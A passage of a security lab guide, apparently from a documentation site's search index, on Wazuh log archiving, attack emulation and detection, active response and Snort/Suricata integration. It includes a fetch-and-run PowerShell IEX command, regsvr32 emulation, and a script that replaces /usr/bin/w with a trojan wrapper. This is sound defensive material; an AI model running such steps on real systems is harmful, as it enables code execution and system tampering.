a rule. These events are stored in the Wazuh archives located at\u00a0<code>/var/ossec/logs/archives/archives.log</code>\u00a0and\u00a0<code>/var/ossec/logs/archives/archives.json</code>. Security teams use archived logs to review historical data of security incidents, analyze trends, and generate reports to hunt threats.</p> <p>By default, the Wazuh archives are disabled because it stores logs indefinitely on the Wazuh server. When enabled, the Wazuh manager creates archived files to store and retain security data for compliance and forensic purposes.</p> <p>Note: The Wazuh archives retain logs collected from all monitored endpoints, therefore consuming significant storage resources on the Wazuh server over time. So, it is important to consider the impact on disk space and performance before enabling them.</p>"},{"location":"wazuh/wazuh.html#enabling-archiving","title":"Enabling archiving","text":"<p>Edit the Wazuh manager configuration file\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0and set the value of the highlighted fields below to\u00a0<code>yes</code>:</p> <pre><code>&lt;ossec_config&gt;\n  &lt;global&gt;\n    &lt;jsonout_output&gt;yes&lt;/jsonout_output&gt;\n    &lt;alerts_log&gt;yes&lt;/alerts_log&gt;\n    &lt;logall&gt;yes&lt;/logall&gt;\n    &lt;logall_json&gt;yes&lt;/logall_json&gt;\n&lt;/ossec_config&gt;\n</code></pre> <p><code>&lt;logall&gt;</code>\u00a0enables or disables archiving of all log messages. When enabled, the Wazuh server stores the logs in a syslog format. The allowed values are\u00a0<code>yes</code>\u00a0and\u00a0<code>no</code>.<code>&lt;logall_json&gt;</code>\u00a0enables or disables logging of events. When enabled, the Wazuh server stores the events in a JSON format. The allowed values are\u00a0<code>yes</code>\u00a0and\u00a0<code>no</code>.</p> <p>Depending on the format you desire, you can set one or both values of the highlighted fields to\u00a0<code>yes</code>. However, only the\u00a0<code>&lt;logall_json&gt;yes&lt;/logall_json&gt;</code>\u00a0option allows you to create an index that can be used to visualize the events on the Wazuh dashboard.</p> <p>Restart the Wazuh manager to apply the configuration changes:</p> <pre><code>systemctl restart wazuh-manager\n</code></pre> <p>Depending on your chosen format, the file\u00a0<code>archives.log</code>,\u00a0<code>archives.json</code>, or both will be created in the\u00a0<code>/var/ossec/logs/archives/</code>\u00a0directory on the Wazuh server. Wazuh uses a default log rotation policy. It ensures that available disk space is conserved by rotating and compressing logs on a daily, monthly, and yearly basis.</p>"},{"location":"wazuh/wazuh.html#visualising-events-on-dashboard","title":"Visualising Events on Dashboard","text":"<p>Edit the Filebeat configuration file\u00a0<code>/etc/filebeat/filebeat.yml</code>\u00a0and change the value of\u00a0<code>archives:\u00a0enabled</code>\u00a0from\u00a0<code>false</code>\u00a0to\u00a0<code>true</code>:</p> <pre><code>archives:\n enabled: true\n</code></pre> <p>Restart Filebeat to apply the configuration changes:</p> <pre><code>systemctl restart filebeat\n</code></pre>"},{"location":"wazuh/wazuh.html#configuring-wazuh-dashboard","title":"Configuring Wazuh Dashboard","text":"<p>Click the upper-left menu icon and navigate to\u00a0Dashboard management\u00a0&gt;\u00a0Index patterns\u00a0&gt;\u00a0Create index pattern. Use\u00a0<code>wazuh-archives-*</code>\u00a0as the index pattern name, and set\u00a0<code>timestamp</code>\u00a0in the\u00a0Time field\u00a0drop-down list.</p> <p></p> <p></p> <p>To view the events on the dashboard, click the upper-left menu icon and navigate to\u00a0Discover. Change the index pattern to\u00a0<code>wazuh-archives-*</code>.</p> <p></p>"},{"location":"wazuh/wazuh.html#introduction-to-wazuh","title":"Introduction to Wazuh","text":""},{"location":"wazuh/wazuh.html#use-case-detecting-signed-binary-proxy-execution","title":"Use case: Detecting Signed Binary Proxy Execution","text":"<p>Signed binary proxy execution is a technique threat actors use to bypass application whitelisting by using trusted binaries to run malicious code. This technique is identified as\u00a0<code>T1218.010</code>\u00a0based on the MITRE ATT&amp;CK framework.</p> <p>In this use case, we show how to abuse the Windows utility,\u00a0<code>regsvr32.exe</code>, to bypass application controls. We then analyse events in the Wazuh archives to detect suspicious activity related to this technique.</p>"},{"location":"wazuh/wazuh.html#atomic-red-team-installation","title":"Atomic Red Team Installation","text":"<p>Note: this has been tested in an isolated Unclassified environment. Perform the following steps to install the Atomic Red Team PowerShell module on a Windows endpoint using PowerShell as an administrator. By default, PowerShell restricts the execution of running scripts. Run the command below to change the default execution policy to\u00a0<code>RemoteSigned</code>:</p> <pre><code>Set-ExecutionPolicy RemoteSigned\n</code></pre> <p>Install the ART execution framework:</p> <pre><code>IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);\nInstall-AtomicRedTeam -getAtomics\n</code></pre> <p>Import the ART module to use\u00a0<code>Invoke-AtomicTest</code>\u00a0function</p> <pre><code>Import-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force\n</code></pre> <p>Use\u00a0<code>Invoke-AtomicTest</code>\u00a0function to show details of the technique\u00a0<code>T1218.010</code></p> <pre><code>Invoke-AtomicTest T1218.010 -ShowDetailsBrief\n</code></pre> <pre><code>#Example output\nPathToAtomicsFolder = C:\\AtomicRedTeam\\atomics\n\nT1218.010-1 Regsvr32 local COM scriptlet execution\nT1218.010-2 Regsvr32 remote COM scriptlet execution\nT1218.010-3 Regsvr32 local DLL execution\nT1218.010-4 Regsvr32 Registering Non DLL\nT1218.010-5 Regsvr32 Silent DLL Install Call DllRegisterServer\n</code></pre>"},{"location":"wazuh/wazuh.html#attack-emulation","title":"Attack Emulation","text":"<p>Emulate the signed binary proxy execution technique on the Windows endpoint. Run the command below with Powershell as an administrator to perform the\u00a0<code>T1218.010</code>\u00a0test.</p> <pre><code>Invoke-AtomicTest T1218.010\n</code></pre> <pre><code>#Example output\nPathToAtomicsFolder = C:\\AtomicRedTeam\\atomics\n\nExecuting test: T1218.010-1 Regsvr32 local COM scriptlet execution\nDone executing test: T1218.010-1 Regsvr32 local COM scriptlet execution\nExecuting test: T1218.010-2 Regsvr32 remote COM scriptlet execution\nDone executing test: T1218.010-2 Regsvr32 remote COM scriptlet execution\nExecuting test: T1218.010-3 Regsvr32 local DLL execution\nDone executing test: T1218.010-3 Regsvr32 local DLL execution\nExecuting test: T1218.010-4 Regsvr32 Registering Non DLL\nDone executing test: T1218.010-4 Regsvr32 Registering Non DLL\nExecuting test: T1218.010-5 Regsvr32 Silent DLL Install Call DllRegisterServer\nDone executing test: T1218.010-5 Regsvr32 Silent DLL Install Call DllRegisterServer\n</code></pre> <p>Several calculator instances will pop up after a successful execution of the exploit.</p> <p></p>"},{"location":"wazuh/wazuh.html#wazuh-dashboard","title":"Wazuh Dashboard","text":"<p>Use the Wazuh archives to query and display events related to the technique being hunted. It's important to note that while consulting the archives, some events might already be captured as alerts on the Wazuh dashboard. You can use information from the Wazuh archives, including alerts and events that have no detection to create custom rules based on your specific requirements.</p> <p>Apply a time range filter to view events that occurred within the last five minutes of when the test was performed. Filter to view logs from the specific Windows endpoint using\u00a0<code>agent.id</code>,\u00a0<code>agent.ip</code>\u00a0or\u00a0<code>agent.name</code>.</p> <p></p> <p>There are multiple hits that you can investigate to determine a correlation with the earlier attack emulation. For instance, you may notice a calculator spawning event similar to the one observed on the Windows endpoint during the test.</p> <p></p> <p>Type\u00a0<code>regsvr32</code>\u00a0in the search bar to streamline and investigate events related to the\u00a0<code>regsvr32</code>\u00a0utility.</p> <p></p> <p>Expand any of the events to view their associated fields.</p> <p></p> <p>Click on the JSON tab to view the JSON format of the archived logs.</p> <p></p> <p>Apply the\u00a0<code>data.win.eventdata.ruleName:technique_id=T1218.010,technique_name=Regsvr32</code>\u00a0filter to see the technique ID as shown below.</p> <p></p> <p>It is recommended to enable archiving as it allows users to view logs from network devices. However, if you prefer not to enable archiving, similar search can be performed on wazuh-alerts- (default) index instead of wazuh-archives- index.</p> <p>Navigate to Home, then Overview on the web UI</p> <p>Select number displayed on the Critical severity</p> <p></p> <p></p> <p>Clear all filters then add the filter data.wineventda.image is C:\\Windows\\SYSWOW64\\regsvr32.exe</p> <p></p>"},{"location":"wazuh/wazuh.html#troubleshooting-index-patterns","title":"Troubleshooting Index Patterns","text":"<p>If search results displays the error icon and the message \u201cNo cached mapping for this field. Refresh field list from the index patterns page,\u201d go to Dashboard Management, Index patterns and select each index. Click refresh button. </p> <p></p> <p></p>"},{"location":"wazuh/wazuh.html#detecting-suspicious-binaries-testing-endpoint-security","title":"Detecting Suspicious Binaries (Testing Endpoint Security)","text":"<p>Wazuh has anomaly and malware detection capabilities that detect suspicious binaries on an endpoint. Binaries are executable code written to perform automated tasks. Malicious actors use them mostly to carry out exploitation to avoid being detected.</p> <p>In this use case, we demonstrate how the Wazuh rootcheck module can detect a trojan system binary on an Ubuntu endpoint. You perform the exploit by replacing the content of a legitimate binary with malicious code to trick the endpoint into running it as the legitimate binary.</p> <p>The Wazuh rootcheck module also checks for hidden processes, ports, and files.</p>"},{"location":"wazuh/wazuh.html#configuration","title":"Configuration","text":"<p>Take the following steps on the Ubuntu endpoint to enable the Wazuh rootcheck module and perform anomaly and malware detection.</p> <p>By default, the Wazuh rootcheck module is enabled in the Wazuh agent configuration file. Check the\u00a0<code>&lt;rootcheck&gt;</code>\u00a0block in the\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0configuration file of the monitored endpoint and make sure that it has the configuration below:</p> <pre><code>&lt;rootcheck&gt;\n    &lt;disabled&gt;no&lt;/disabled&gt;\n    &lt;check_files&gt;yes&lt;/check_files&gt;\n\n    &lt;!-- Line for trojans detection --&gt;\n    &lt;check_trojans&gt;yes&lt;/check_trojans&gt;\n\n    &lt;check_dev&gt;yes&lt;/check_dev&gt;\n    &lt;check_sys&gt;yes&lt;/check_sys&gt;\n    &lt;check_pids&gt;yes&lt;/check_pids&gt;\n    &lt;check_ports&gt;yes&lt;/check_ports&gt;\n    &lt;check_if&gt;yes&lt;/check_if&gt;\n\n    &lt;!-- Frequency that rootcheck is executed - every 12 hours --&gt;\n    &lt;frequency&gt;43200&lt;/frequency&gt;\n    &lt;rootkit_files&gt;/var/ossec/etc/shared/rootkit_files.txt&lt;/rootkit_files&gt;\n    &lt;rootkit_trojans&gt;/var/ossec/etc/shared/rootkit_trojans.txt&lt;/rootkit_trojans&gt;\n    &lt;skip_nfs&gt;yes&lt;/skip_nfs&gt;\n&lt;/rootcheck&gt;\n</code></pre>"},{"location":"wazuh/wazuh.html#attack-emulation_1","title":"Attack Emulation","text":"<p>Create a copy of the original system binary:</p> <pre><code>sudo cp -p /usr/bin/w /usr/bin/w.copy\n</code></pre> <p>Replace the original system binary\u00a0<code>/usr/bin/w</code>\u00a0with the following shell script:</p> <pre><code>sudo tee /usr/bin/w &lt;&lt; EOF\n!/bin/bash\necho \"`date` this is evil\" &gt; /tmp/trojan_created_file\necho 'test for /usr/bin/w trojaned file' &gt;&gt; /tmp/trojan_created_file\nNow running original binary\n/usr/bin/w.copy\nEOF\n</code></pre> <p>The rootcheck scan runs every 12 hours by default. Force a scan by restarting the Wazuh agent to see the relevant alert:</p> <pre><code>sudo systemctl restart wazuh-agent\n</code></pre>"},{"location":"wazuh/wazuh.html#visualising-alerts","title":"Visualising Alerts","text":"<p>You can visualise the alert data in the Wazuh dashboard. To do this, go to the\u00a0Threat Hunting\u00a0module and add the filters in the search bar to query the alerts. <code>location:rootcheck AND rule.id:510</code></p> <p></p>"},{"location":"wazuh/wazuh.html#file-integrity-monitoring-testing-endpoint-security","title":"File Integrity Monitoring (Testing Endpoint Security)","text":"<p>File Integrity Monitoring (FIM) helps in auditing sensitive files and meeting regulatory compliance requirements. Wazuh has an inbuilt\u00a0FIM\u00a0module that monitors file system changes to detect the creation, modification, and deletion of files.</p>"},{"location":"wazuh/wazuh.html#configuring-ubuntu-endpoint","title":"Configuring Ubuntu Endpoint","text":"<p>Edit the Wazuh agent\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0configuration file. Add the directories for monitoring within the\u00a0<code>&lt;syscheck&gt;</code>\u00a0block. For this use case, you configure Wazuh to monitor the\u00a0<code>/root</code>\u00a0directory.\u00a0</p> <pre><code>&lt;directories check_all=\"yes\" report_changes=\"yes\" realtime=\"yes\"&gt;/root&lt;/directories&gt;\n</code></pre> <p>Restart the Wazuh agent to apply the configuration changes:</p> <pre><code>sudo systemctl restart wazuh-agent\n</code></pre>"},{"location":"wazuh/wazuh.html#testing-configuration","title":"Testing Configuration","text":"<ol> <li>Create a text file in the monitored directory then wait for 5 seconds.</li> <li>Add content to the text file and save it. Wait for 5 seconds.</li> <li>Delete the text file from the monitored directory.</li> </ol>"},{"location":"wazuh/wazuh.html#visualising-alerts_1","title":"Visualising Alerts","text":"<p>You can visualise the alert data in the Wazuh dashboard. To do this, go to the\u00a0File Integrity Monitoring\u00a0module and add the filters in the search bar to query the alerts:<code>rule.id:\u00a0is\u00a0one\u00a0of\u00a0550,553,554</code></p> <p></p>"},{"location":"wazuh/wazuh.html#vulnerability-detection-testing-threat-intelligence","title":"Vulnerability Detection (Testing Threat Intelligence)","text":"<p>Wazuh uses the Vulnerability Detection module to identify vulnerabilities in applications and operating systems running on endpoints.</p> <p>This use case shows how Wazuh detects unpatched Common Vulnerabilities and Exposures (CVEs) in the monitored endpoint.</p>"},{"location":"wazuh/wazuh.html#configuration_1","title":"Configuration","text":"<p>The Vulnerability Detection module is enabled by default. You can perform the following steps on the Wazuh server to ensure that the Wazuh Vulnerability Detection module is enabled and properly configured.</p> <p>Open the\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0file on the Wazuh server. Check the following settings. Vulnerability Detection is enabled:</p> <pre><code>&lt;vulnerability-detection&gt;\n   &lt;enabled&gt;yes&lt;/enabled&gt;\n   &lt;index-status&gt;yes&lt;/index-status&gt;\n   &lt;feed-update-interval&gt;60m&lt;/feed-update-interval&gt;\n&lt;/vulnerability-detection&gt;\n</code></pre> <p>The indexer connection is properly configured. By default, the indexer settings have one host configured. It's set to\u00a0<code>0.0.0.0</code>\u00a0as highlighted below.</p> <pre><code>&lt;indexer&gt;\n  &lt;enabled&gt;yes&lt;/enabled&gt;\n  &lt;hosts&gt;\n    &lt;host&gt;https://0.0.0.0:9200&lt;/host&gt;\n  &lt;/hosts&gt;\n  &lt;ssl&gt;\n    &lt;certificate_authorities&gt;\n      &lt;ca&gt;/etc/filebeat/certs/root-ca.pem&lt;/ca&gt;\n    &lt;/certificate_authorities&gt;\n    &lt;certificate&gt;/etc/filebeat/certs/filebeat.pem&lt;/certificate&gt;\n    &lt;key&gt;/etc/filebeat/certs/filebeat-key.pem&lt;/key&gt;\n  &lt;/ssl&gt;\n&lt;/indexer&gt;\n</code></pre> <p>Replace\u00a0<code>0.0.0.0</code>\u00a0with your Wazuh indexer node IP address or hostname. You can find this value in the Filebeat config file\u00a0<code>/etc/filebeat/filebeat.yml</code>. Ensure the Filebeat certificate and key name match the certificate files in\u00a0<code>/etc/filebeat/certs</code>. If you made changes to the configuration, restart the Wazuh manager.</p> <pre><code>sudo systemctl restart wazuh-manager\n</code></pre>"},{"location":"wazuh/wazuh.html#visualising-alerts_2","title":"Visualising Alerts","text":"<p>You can visualise the detected vulnerabilities in the Wazuh dashboard. To see a list of active vulnerabilities, go to\u00a0Vulnerability Detection\u00a0and select\u00a0Inventory.</p> <p></p> <p></p>"},{"location":"wazuh/wazuh.html#incident-response","title":"Incident Response","text":"<p>The goal of incident response is to effectively handle a security incident and restore normal business operations as quickly as possible. As organizations\u2019 digital assets continuously grow, managing incidents manually becomes increasingly challenging, hence the need for automation.</p>"},{"location":"wazuh/wazuh.html#wazuh-active-response-module","title":"Wazuh Active Response module","text":"<p>The Wazuh\u00a0Active Response\u00a0module allows users to run automated actions when incidents are detected on endpoints. This improves an organization's incident response processes, enabling security teams to take immediate and automated actions to counter detected threats.</p>"},{"location":"wazuh/wazuh.html#default-active-response-actions","title":"Default Active Response Actions","text":"<p>Out-of-the-box scripts are available on every operating system that runs the Wazuh agents. Some of the\u00a0default active response\u00a0scripts include</p> Name of script Description disable-account Disables a user account firewall-drop Adds an IP address to the iptables deny list. firewalld-drop Adds an IP address to the firewalld drop list. restart.sh Restarts the Wazuh agent or server. netsh.exe Blocks an IP address using netsh."},{"location":"wazuh/wazuh.html#custom-active-response-actions","title":"Custom Active Response Actions","text":"<p>One of the benefits of the Wazuh Active Response module is its adaptability. Wazuh allows security teams to create\u00a0custom active response\u00a0actions in any programming language, tailoring them to their specific needs.</p>"},{"location":"wazuh/wazuh.html#disabling-user-account-after-a-brute-force-attack-testing-default-active-response","title":"Disabling User Account After a Brute-Force Attack (Testing Default Active Response)","text":"<p>Account lockout is a security measure used to defend against brute force attacks by limiting the number of login attempts a user can make within a specified time. We use the Wazuh Active Response module to disable the user account whose password is being guessed by an attacker.</p> <p>In the image below, the Wazuh Active Response module disables the account on a Linux endpoint and re-enables it again after 5 minutes.</p> <p>After SSH Brute Force attack was launched from Kali machine, the login was disabled for 60 seconds because of 3 bad attempts</p> <p></p>"},{"location":"wazuh/wazuh.html#blocking-a-known-malicious-actor-testing-custom-active-response","title":"Blocking a Known Malicious Actor (Testing Custom Active Response)","text":"<p>In this use case, we demonstrate how to block malicious IP addresses from accessing web resources on a web server. </p>"},{"location":"wazuh/wazuh.html#configuring-ubuntu-endpoint_1","title":"Configuring Ubuntu endpoint","text":"<p>Update local packages and install the Apache web server:</p> <pre><code>sudo apt update\nsudo apt install apache2\n</code></pre> <p>If the firewall is enabled, modify the firewall to allow external access to web ports. Skip this step if the firewall is disabled:</p> <pre><code>sudo ufw status\nsudo ufw app list\nsudo ufw allow 'Apache'\n</code></pre> <p>Check the status of the Apache service to verify that the web server is running:</p> <pre><code>sudo systemctl status apache2\n</code></pre> <p>Use the\u00a0<code>curl</code>\u00a0command or open\u00a0<code>http://&lt;UBUNTU_IP&gt;</code>\u00a0in a browser to view the Apache landing page and verify the installation:</p> <pre><code>curl http://&lt;UBUNTU_IP&gt;\n</code></pre> <p>Add the following to\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0file to configure the Wazuh agent and monitor the Apache access logs:</p> <pre><code>&lt;localfile&gt;\n  &lt;log_format&gt;syslog&lt;/log_format&gt;\n  &lt;location&gt;/var/log/apache2/access.log&lt;/location&gt;\n&lt;/localfile&gt;\n</code></pre> <p>Restart the Wazuh agent to apply the changes:</p> <pre><code>sudo systemctl restart wazuh-agent\n</code></pre>"},{"location":"wazuh/wazuh.html#configuring-the-wazuh-server","title":"Configuring the Wazuh server","text":"<p>Download the utilities and configure the CDB list. Download the Alienvault IP reputation database:</p> <pre><code>sudo wget https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/alienvault_reputation.ipset -O /var/ossec/etc/lists/alienvault_reputation.ipset\n</code></pre> <p>Append the IP address of the attacker endpoint to the IP reputation database. Replace\u00a0<code>&lt;ATTACKER_IP&gt;</code>\u00a0with the Kali IP address in the command below:</p> <pre><code>sudo echo \"&lt;ATTACKER_IP&gt;\" &gt;&gt; /var/ossec/etc/lists/alienvault_reputation.ipset\n</code></pre> <p>Download a script to convert from the\u00a0<code>.ipset</code>\u00a0format to the\u00a0<code>.cdb</code>\u00a0list format:</p> <pre><code>sudo wget https://wazuh.com/resources/iplist-to-cdblist.py -O /tmp/iplist-to-cdblist.py\n</code></pre> <p>Convert the\u00a0<code>alienvault_reputation.ipset</code>\u00a0file to a\u00a0<code>.cdb</code>\u00a0format using the previously downloaded script:</p> <pre><code>sudo /var/ossec/framework/python/bin/python3 /tmp/iplist-to-cdblist.py /var/ossec/etc/lists/alienvault_reputation.ipset /var/ossec/etc/lists/blacklist-alienvault\n</code></pre> <p>Assign the right permissions and ownership to the generated file:</p> <pre><code>sudo chown wazuh:wazuh /var/ossec/etc/lists/blacklist-alienvault\n</code></pre>"},{"location":"wazuh/wazuh.html#configure-the-active-response-module-to-block-the-malicious-ip-address","title":"Configure the active response module to block the malicious IP address","text":"<p>Add a custom rule to trigger a Wazuh\u00a0active response\u00a0script. Do this in the Wazuh server\u00a0<code>/var/ossec/etc/rules/local_rules.xml</code>\u00a0custom ruleset file:</p> <pre><code>&lt;group name=\"attack,\"&gt;\n  &lt;rule id=\"100100\" level=\"10\"&gt;\n    &lt;if_group&gt;web|attack|attacks&lt;/if_group&gt;\n    &lt;list field=\"srcip\" lookup=\"address_match_key\"&gt;etc/lists/blacklist-alienvault&lt;/list&gt;\n    &lt;description&gt;IP address found in AlienVault reputation database.&lt;/description&gt;\n  &lt;/rule&gt;\n&lt;/group&gt;\n</code></pre> <p>Edit the Wazuh server\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0configuration file and add the\u00a0<code>etc/lists/blacklist-alienvault</code>\u00a0list to the\u00a0<code>&lt;ruleset&gt;</code>\u00a0section:</p> <pre><code>&lt;ossec_config&gt;\n  &lt;ruleset&gt;\n    &lt;!-- Default ruleset --&gt;\n    &lt;decoder_dir&gt;ruleset/decoders&lt;/decoder_dir&gt;\n    &lt;rule_dir&gt;ruleset/rules&lt;/rule_dir&gt;\n    &lt;rule_exclude&gt;0215-policy_rules.xml&lt;/rule_exclude&gt;\n    &lt;list&gt;etc/lists/audit-keys&lt;/list&gt;\n    &lt;list&gt;etc/lists/amazon/aws-eventnames&lt;/list&gt;\n    &lt;list&gt;etc/lists/security-eventchannel&lt;/list&gt;\n    &lt;list&gt;etc/lists/blacklist-alienvault&lt;/list&gt;\n\n    &lt;!-- User-defined ruleset --&gt;\n    &lt;decoder_dir&gt;etc/decoders&lt;/decoder_dir&gt;\n    &lt;rule_dir&gt;etc/rules&lt;/rule_dir&gt;\n  &lt;/ruleset&gt;\n\n&lt;/ossec_config&gt;\n</code></pre> <p>Add the active response block to the Wazuh server\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0file:</p> <p>The\u00a0<code>firewall-drop</code>\u00a0command integrates with the Ubuntu local iptables firewall and drops incoming network connection from the attacker endpoint for 60 seconds: Remember to uncomment the code block (remove <code>&lt;!--</code> and <code>--&gt;</code> )</p> <pre><code>&lt;ossec_config&gt;\n  &lt;active-response&gt;\n    &lt;command&gt;firewall-drop&lt;/command&gt;\n    &lt;location&gt;local&lt;/location&gt;\n    &lt;rules_id&gt;100100&lt;/rules_id&gt;\n    &lt;timeout&gt;60&lt;/timeout&gt;\n  &lt;/active-response&gt;\n&lt;/ossec_config&gt;\n</code></pre> <p>Restart the Wazuh manager to apply the changes:</p> <pre><code>sudo systemctl restart wazuh-manager\n</code></pre>"},{"location":"wazuh/wazuh.html#attack-emulation_2","title":"Attack Emulation","text":"<p>Access any of the web servers from the Kali endpoint using the corresponding IP address. Replace\u00a0<code>&lt;WEBSERVER_IP&gt;</code>\u00a0with the appropriate value and execute the following command from the attacker endpoint:</p> <pre><code>curl http://&lt;WEBSERVER_IP&gt;\n</code></pre> <p>The attacker endpoint connects to the victim's web servers the first time. After the first connection, the Wazuh active response module temporarily blocks any successive connection to the web servers for 60 seconds.</p> <p></p>"},{"location":"wazuh/wazuh.html#visualising-alerts_3","title":"Visualising Alerts","text":"<p>You can visualize the alert data in the Wazuh dashboard. To do this, go to the\u00a0Threat Hunting\u00a0module and add the filters in the search bar to query the alerts:\u00a0<code>rule.id is one of 651, 100100</code></p> <p></p>"},{"location":"wazuh/wazuh.html#network-ids-integration","title":"Network IDS integration","text":""},{"location":"wazuh/wazuh.html#snort3","title":"Snort3","text":"<p>Install Wazuh agent on a Linux host where Snort3 is installed. Edit Snort\u2019s configuration:</p> <pre><code>sudo nano /usr/local/etc/snort/snort.lua\n</code></pre> <p>Uncomment alert_full and add file=true</p> <pre><code>---------------------------------------------------------------------------\n-- 7. configure outputs\n---------------------------------------------------------------------------\n\n-- event logging\n-- you can enable with defaults from the command line with -A &lt;alert_type&gt;\n-- uncomment below to set non-default configs\n--alert_csv = { }\n--alert_fast = {file=true}\nalert_full = {file=true}\n--alert_sfsocket = { }\n--alert_syslog = { }\n--unified2 = { }\n</code></pre> <p>Edit the\u00a0<code>/var/ossec/etc/ossec.conf</code>\u00a0file of Wazuh agent and add the new\u00a0<code>localfile</code>\u00a0entry: Make sure indentation is correct.</p> <pre><code>&lt;localfile&gt;\n  &lt;log_format&gt;snort-full&lt;/log_format&gt;\n  &lt;location&gt;/var/log/snort/alert_full.txt&lt;/location&gt;\n&lt;/localfile&gt;\n</code></pre> <p>Restart the Wazuh agent.</p> <pre><code>systemctl restart wazuh-agent\n</code></pre> <p>Run Snort3 with the following parameters:</p> <pre><code>sudo snort -c /usr/local/etc/snort/snort.lua -i ens32 -A alert_full -l /var/log/snort\n</code></pre> <p>Note: Snort3 is currently configured to read local.rules for demonstration purposes. </p> <p>Execute ping to 10.0.0.22 (Snort3 VM) from another host. Verify alert_full.txt is generated</p> <pre><code>#Example output\nroot@Snort:/var/log/snort# ls\nalert_fast.txt  alert_full.txt\n</code></pre> <p>On Wazuh dashboard, verify IDS Event alerts are generated and it points to alert_full.txt</p> <p></p> <p></p>"},{"location":"wazuh/wazuh.html#suricata","title":"Suricata","text":"<p>Install Wazuh agent on a Linux host where Suricata is installed. Changes the permissions of all files in the Suricata\u2019s <code>/rules/</code> directories:</p> <pre><code>sudo chmod 640 /var/lib/suricata/rules/*.rules\nsudo chmod 640 /usr/share/suricata/rules/*.rules\n</code></pre> <p>Modify Suricata settings in the\u00a0<code>/etc/suricata/suricata.yaml</code>\u00a0file and set the following variables:</p> <pre><code>vars:\n  # more specific is better for alert accuracy and performance\n  address-groups:\n    HOME_NET: \"[10.0.0.0/24]\"\n...\ncommunity-id: true\n...\naf-packet:\n    - interface: ens32\n      cluster-id: 99\n      cluster-type: cluster_flow\n      defrag: yes\n      use-mmap: yes\n...\n# Cross platform libpcap capture support\npcap:\n  - interface: ens32\n</code></pre> <p><code>interface</code>\u00a0represents the network interface you want to monitor. Replace the value with the interface name of the Ubuntu endpoint. For example,\u00a0<code>ens32</code> </p> <p>Restart the Suricata service:</p> <pre><code>sudo systemctl restart suricata\n</code></pre> <p>Add the following configuration to the <code>/var/ossec/etc/ossec.conf</code> file of the Wazuh agent. This allows the Wazuh agent to read the Suricata logs file:</p> <pre><code>&lt;ossec_config&gt;\n  &lt;localfile&gt;\n    &lt;log_format&gt;json&lt;/log_format&gt;\n    &lt;location&gt;/var/log/suricata/eve.json&lt;/location&gt;\n  &lt;/localfile&gt;\n&lt;/ossec_config&gt;\n</code></pre> <p>Restart the Wazuh agent to apply the changes:</p> <pre><code>sudo systemctl restart wazuh-agent\n</code></pre>"},{"location":"wazuh/wazuh.html#attack-emulation_3","title":"Attack Emulation","text":"<p>Wazuh automatically parses data from\u00a0<code>/var/log/suricata/eve.json</code>\u00a0and generates related alerts on the Wazuh dashboard. From the Ubuntu host, run:</p> <pre><code>curl http://testmynids.org/uid/index.html\n</code></pre> <p>Expected response should be similar to:</p> <pre><code>09/12/2024-13:51:32.520238  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.53:80 -&gt; 10.0.0.25:34606Alerts:\n</code></pre> <p>Verify the results in Wazuh dashboard. Naviage to Threat Hunting &gt; Suricata</p> <p></p>"},{"location":"wazuh/wazuh.html#references","title":"References","text":"<ul> <li>https://www.youtube.com/watch?v=Lb_ukgtYK_U&amp;list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&amp;index=5</li> <li>https://documentation.wazuh.com/current/deployment-options/offline-installation.html</li> <li>https://wazuh.com/blog/monitoring-network-devices/?highlight=network device</li> <li>https://dorian5.medium.com/rsyslog-setup-on-ubuntu-for-fortigate-log-data-9d6c651acbd0</li> <li>https://wazuh.com/blog/monitoring-network-devices/?highlight=network device</li> <li>https://wazuh.com/blog/creating-decoders-and-rules-from-scratch/?highlight=fortigate</li> </ul>"},{"location":"wireshark/wireshark.html","title":"Wireshark","text":"<p>Wireshark is a free and open-source network protocol analyser widely used for network troubleshooting, analysis, software and protocol development, and education. Essentially, it's a tool that allows you to capture and examine data packets traveling through a network in real-time or from saved capture files.</p>"},{"location":"wireshark/wireshark.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, Wireshark was installed on a Windows Virtual Machine (VM),  and malware traffic analysis was conducted using Wireshark. </p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) WS2019 Windows Server 2019 Wireshark 10.0.0.40 Kali Kali Linux 2024.2 Linux Client 10.0.0.22 <p></p>"},{"location":"wireshark/wireshark.html#install-wireshark-on-windows","title":"Install Wireshark on Windows","text":"<p>If you are running Windows or macOS you can download an official release at\u00a0https://www.wireshark.org/download.html. For Linux and other OS, download both source and binary distributions from the Wireshark download page. Select the package most appropriate for your system. In this demo, we will focus on installing and running Wireshark on Windows. </p> <p>Double-click on the installer file and follow the prompts. Make sure T Shark is selected.</p> <p></p> <p>Once install is complete, open Wireshark. You will be presented with network interfaces attacked to your computer.</p> <p></p> <p>For demonstration, double-click on the loopback interface. Immediately, Wireshark will start capturing traffic on the loopback interface.</p> <p>You can stop the traffic capture by clicking the stop button.</p> <p></p> <p>From the menu, select Statistics, Capture File Properties. You can see Time for first and last packet as long as elapsed time. </p> <p></p> <p>To view Protocol Hierarchy, select Statistics, Protocol Hierarchy. You will be presented of list of protocols that exist in this packet capture (PCAP). </p> <p></p> <p>You can Apply or Prepare as Filter on any selected value.</p> <p></p> <p>To view Conversations, select Statistics, Conversations and click IPv4. This shows conversations between one host and another host. </p> <p></p> <p>To view Endpoints, select Statistics, Endpoints and click IPv4. This will tell us what endpoints exist in this PCAP. </p> <p></p>"},{"location":"wireshark/wireshark.html#install-wireshark-on-linux","title":"Install Wireshark on Linux","text":"<p>Create a directory for the packages: Open a terminal and create a directory to store the Wireshark package and its dependencies.</p> <pre><code>mkdir wireshark-offline\ncd wireshark-offline\n</code></pre> <p>Download the Wireshark package and 